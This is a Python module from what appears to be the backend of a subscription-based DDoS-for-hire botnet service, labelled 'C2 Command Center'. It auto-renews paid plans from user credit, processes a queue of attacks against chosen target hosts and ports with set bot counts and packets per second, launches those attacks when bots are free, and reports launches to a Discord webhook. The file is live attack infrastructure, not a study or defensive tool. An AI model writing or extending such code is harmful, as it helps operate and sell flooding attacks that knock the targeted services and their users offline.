"""Auto-renew subscriptions, webhook notifications, attack queue processor."""
from datetime import datetime, timezone, timedelta
from sqlalchemy import select, update
from app.database import async_session
from app.models.all_models import (
    UserSubscription, Plan, User, SiteSettings,
    AttackQueue, AttackTask, Bot, AttackTemplate,
)
from app.services.attack_service import AttackService
from app.schemas.all_schemas import AttackCreate
import aiohttp
import asyncio


async def process_auto_renew():
    """Auto-renew expired subscriptions if user has enough credit."""
    async with async_session() as s:
        now = datetime.now(timezone.utc)
        # Find expired subscriptions with auto_renew=True
        result = await s.execute(
            select(UserSubscription).where(
                UserSubscription.status == "active",
                UserSubscription.auto_renew == True,
                UserSubscription.expires_at < now,
            )
        )
        expired = result.scalars().all()
        renewed = 0
        for sub in expired:
            # Get plan price
            plan = (await s.execute(select(Plan).where(Plan.id == sub.plan_id))).scalar_one_or_none()
            if not plan:
                sub.status = "expired"
                continue
            # Get user
            user = (await s.execute(select(User).where(User.id == sub.user_id))).scalar_one_or_none()
            if not user or user.is_banned:
                sub.status = "expired"
                continue
            # Check credit
            if user.credit_balance < plan.price_vnd:
                sub.status = "expired"
                continue
            # Charge and renew
            user.credit_balance -= plan.price_vnd
            sub.expires_at = now + timedelta(days=30)
            sub.status = "active"
            renewed += 1
        if renewed:
            await s.commit()
            print(f"[auto-renew] Renewed {renewed} subscriptions")


async def send_webhook(event: str, message: str, details: dict = None):
    """Send notification to Discord webhook + Telegram admin."""
    async with async_session() as s:
        settings = (await s.execute(select(SiteSettings).where(SiteSettings.id == 1))).scalar_one_or_none()
    if settings and settings.discord_webhook_url:
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "embeds": [{
                        "title": f"🔔 {event}",
                        "description": message,
                        "color": 0x10b981 if "complete" in event.lower() or "online" in event.lower() else 0xef4444,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "footer": {"text": "C2 Command Center"},
                    }]
                }
                async with session.post(settings.discord_webhook_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status not in (200, 204):
                        print(f"[webhook] Discord returned {r.status}")
        except Exception as e:
            print(f"[webhook] Discord error: {e}")


async def process_attack_queue():
    """Process queued attacks — launch when bots become available."""
    async with async_session() as s:
        # Find queued attacks ordered by created_at
        result = await s.execute(
            select(AttackQueue).where(AttackQueue.status == "queued")
            .order_by(AttackQueue.created_at)
            .limit(10)
        )
        queued = result.scalars().all()
        for item in queued:
            # Check if enough bots available
            user = (await s.execute(select(User).where(User.id == item.user_id))).scalar_one_or_none()
            if not user:
                item.status = "cancelled"
                continue
            from app.services.bot_service import BotService
            available = await BotService.get_available_bots(item.user_id, item.method)
            if len(available) >= item.bot_count:
                # Launch attack
                try:
                    atk = AttackCreate(
                        target_host=item.target_host,
                        target_port=item.target_port,
                        method=item.method,
                        duration_secs=item.duration_secs,
                        pps_per_bot=item.pps_per_bot,
                        bot_count=item.bot_count,
                    )
                    task = await AttackService.launch(user, atk)
                    item.status = "running"
                    item.task_id = task.id
                    item.started_at = datetime.now(timezone.utc)
                    await s.commit()
                    print(f"[queue] Launched queued attack {item.id} → task {task.id}")
                    await send_webhook("Attack Queued → Launched", f"Target: {item.target_host}:{item.target_port}\nMethod: {item.method}")
                except Exception as e:
                    print(f"[queue] Launch failed: {e}")
                    # Leave in queued status, will retry next cycle


async def run_background_tasks():
    """Main loop — runs all background tasks periodically."""
    while True:
        try:
            await asyncio.gather(
                process_auto_renew(),
                process_attack_queue(),
            )
        except Exception as e:
            print(f"[background] Error: {e}")
        await asyncio.sleep(30)  # Every 30 seconds
